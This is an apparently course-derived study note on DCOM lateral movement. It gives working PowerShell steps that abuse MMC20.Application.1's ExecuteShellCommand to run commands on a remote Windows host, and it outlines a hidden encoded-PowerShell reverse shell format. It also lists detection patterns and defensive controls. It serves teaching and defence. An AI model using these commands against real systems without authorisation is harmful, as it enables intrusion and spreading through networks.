## Overview

**DCOM** stands for:

```text
Distributed Component Object Model
```

It is Microsoft’s networked extension of **COM**, which allows software components to communicate with each other.

For lateral movement, DCOM can be abused to execute commands on a remote Windows system when the user has the required permissions.

Simple idea:

```text
Local admin on target
+
DCOM/RPC access
+
Remote COM object that can execute commands
=
Remote command execution
```

In this lesson, the abused DCOM object is:

```text
MMC20.Application.1
```

This is the Microsoft Management Console COM application.

---

# Simple Mental Model

Think of DCOM as:

```text
remote control for certain Windows COM objects
```

If you are allowed to activate a remote COM object, and that object exposes a method that can execute commands, you may be able to run commands remotely.

In this example:

```text
CLIENT74
  |
  | remotely creates MMC object
  v
FILES04
  |
  | MMC ExecuteShellCommand runs command
  v
command executes on FILES04
```

---

# COM vs DCOM

| Technology | Meaning | Scope |
|---|---|---|
| COM | Component Object Model | Local process / same machine |
| DCOM | Distributed Component Object Model | Remote machines over the network |

Plain English:

```text
COM lets Windows components talk locally.
DCOM lets Windows components talk across the network.
```

---

# Why DCOM Can Be Used for Lateral Movement

DCOM can remotely instantiate certain COM objects.

Some COM objects expose methods that perform actions such as:

```text
launching commands
opening documents
automating management consoles
interacting with system components
```

If a remote COM object allows command execution, and the authenticated user is authorized, it can be abused for lateral movement.

---

# Required Access

To abuse this DCOM technique, you generally need:

```text
local administrator access on the target
RPC/DCOM reachable
target allows remote DCOM activation
firewall permits required traffic
```

In this lesson:

```text
corp\jen has the required access on FILES04
```

---

# Ports and Protocols

DCOM uses RPC.

Important port:

```text
TCP 135
```

RPC may also use dynamic high ports after initial negotiation.

Practical takeaway:

```text
If TCP 135 or dynamic RPC ports are blocked, DCOM lateral movement may fail.
```

---

# Technique Used in This Lesson

The technique abuses the Microsoft Management Console COM application:

```text
MMC20.Application.1
```

The relevant method is:

```text
ExecuteShellCommand
```

It is exposed under:

```text
Document.ActiveView
```

Full method path:

```text
$dcom.Document.ActiveView.ExecuteShellCommand()
```

This method can execute a shell command on the remote host.

---

# ExecuteShellCommand Parameters

The method accepts four parameters:

```text
Command
Directory
Parameters
WindowState
```

Example:

```powershell
ExecuteShellCommand("cmd", $null, "/c calc", "7")
```

| Parameter | Example | Meaning |
|---|---|---|
| `Command` | `cmd` | Program to run |
| `Directory` | `$null` | Working directory |
| `Parameters` | `/c calc` | Arguments passed to command |
| `WindowState` | `7` | Window display state |

In this lesson, the important parameters are:

```text
Command
Parameters
```

# Step 1 – Instantiate the Remote MMC COM Object

From an elevated PowerShell prompt on CLIENT74:

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

What this does:

```text
Creates an MMC20.Application.1 COM object on the remote host.
Stores the object in the $dcom variable.
```

Important target value:

```text
192.168.50.73
```

This is the IP address of FILES04.

---

# Step 2 – Execute a Test Command

Run Calculator remotely:

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

Plain English:

```text
Tell the remote MMC object to run cmd.exe.
Pass /c calc as the argument.
cmd.exe starts calc on FILES04.
```

---

# Why Calculator May Not Be Visible

The process may run in:

```text
Session 0
```

Session 0 is used by services and non-interactive processes.

This means:

```text
calc may run successfully
but not appear on a logged-in user's desktop
```

So verify using process listing, not the GUI.

---

# Step 3 – Verify Execution on FILES04

On FILES04, check for Calculator:

```cmd
tasklist | findstr "calc"
```

Expected output:

```text
win32calc.exe                 4764 Services                   0     12,132 K
```

Interpretation:

```text
Calculator is running on FILES04.
The DCOM command execution worked.
```

# DCOM Reverse Shell Payload

After confirming command execution with Calculator, replace the test command with a PowerShell payload.

The payload format used in the lesson:

```text
powershell -nop -w hidden -e <base64_payload>
```

Where:

```text
-nop
```

means:

```text
no profile
```

and:

```text
-w hidden
```

means:

```text
hidden window
```

and:

```text
-e
```

means:

```text
encoded command
```

# DCOM vs WMI vs WinRM vs PsExec

| Technique | Main Protocol | Main Requirement | Execution Style |
|---|---|---|---|
| DCOM | RPC/DCOM | Local admin | Remote COM object method |
| WMI | RPC/DCOM | Local admin | `Win32_Process.Create` |
| WinRM | HTTP(S) | Admin or Remote Management Users | Remote shell/session |
| PsExec | SMB | Local admin + ADMIN$ | Remote service creation |

Plain English:

```text
DCOM uses remote COM automation.
WMI uses management classes.
WinRM uses remote shell functionality.
PsExec uses SMB and services.
```

---

# When to Try DCOM

DCOM may be useful when:

```text
you have local admin on the target
RPC/DCOM is reachable
WinRM is disabled
PsExec is blocked or noisy
WMI does not work
you want another lateral movement option
```

# Common Failure Causes

## Remote Object Creation Fails

Possible causes:

```text
user is not local admin on target
DCOM blocked by firewall
RPC port 135 blocked
dynamic RPC ports blocked
remote activation not allowed
wrong target IP
target offline
```

---

## ExecuteShellCommand Fails

Possible causes:

```text
remote MMC object did not instantiate
method blocked
permissions insufficient
command syntax incorrect
AV/EDR blocked process creation
PowerShell execution blocked
```

---

## Calculator Does Not Appear

This is expected in many cases.

Check:

```cmd
tasklist | findstr "calc"
```

Reason:

```text
process runs in Session 0
GUI may not appear on interactive desktop
```

---

## Reverse Shell Does Not Connect Back

Possible causes:

```text
wrong Kali IP
wrong listener port
egress blocked
payload encoded incorrectly
PowerShell blocked
AV/EDR blocked payload
firewall blocked outbound connection
```

# Defensive Notes

## Detection Opportunities

DCOM lateral movement may generate:

```text
RPC/DCOM connections to TCP 135
remote COM activation
MMC COM object usage
mmc.exe or related COM activity
remote process creation
PowerShell launched through COM/DCOM
unusual child processes from DCOM-related components
network connections from target to attacker host
```

Suspicious command patterns:

```text
MMC20.Application.1
ExecuteShellCommand
powershell -nop -w hidden -e
cmd /c
```

---

## Defensive Controls

Reduce DCOM lateral movement risk by:

```text
limiting local administrator rights
restricting DCOM/RPC access between hosts
blocking unnecessary lateral RPC traffic
using host firewalls
monitoring remote COM activation
monitoring suspicious PowerShell execution
monitoring encoded PowerShell commands
monitoring outbound callbacks
applying tiered administration
preventing admin credential reuse
```

---

# Key Takeaways

- DCOM is the networked extension of COM.
- DCOM can allow remote interaction with COM objects.
- This technique abuses the `MMC20.Application.1` COM object.
- The useful method is `Document.ActiveView.ExecuteShellCommand`.
- Local administrator access is required on the target.
- DCOM uses RPC over TCP 135 and dynamic RPC ports.
- Calculator may execute in Session 0 and not appear on the desktop.
- Verify execution with `tasklist`, `hostname`, and `whoami`.
- DCOM is another lateral movement option alongside WMI, WinRM, PsExec, PtH, and PtT.
- Defensive teams can monitor for remote COM activation and suspicious `ExecuteShellCommand` usage.
